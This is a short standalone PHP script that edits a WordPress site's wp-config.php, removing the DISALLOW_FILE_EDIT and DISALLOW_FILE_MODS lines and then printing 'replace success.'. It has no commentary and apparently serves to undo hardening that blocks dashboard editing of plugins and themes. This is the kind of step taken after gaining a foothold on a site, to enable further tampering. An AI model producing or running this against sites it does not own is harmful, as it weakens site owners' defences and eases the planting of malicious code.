<?php
$newpt="../../wp-config.php";
$newfile = file_get_contents($newpt);
$newfile = str_replace("define('DISALLOW_FILE_EDIT', true);","",$newfile);
$newfile = str_replace("define('DISALLOW_FILE_MODS', true);","",$newfile);
file_put_contents($newpt,$newfile);
echo "replace success.";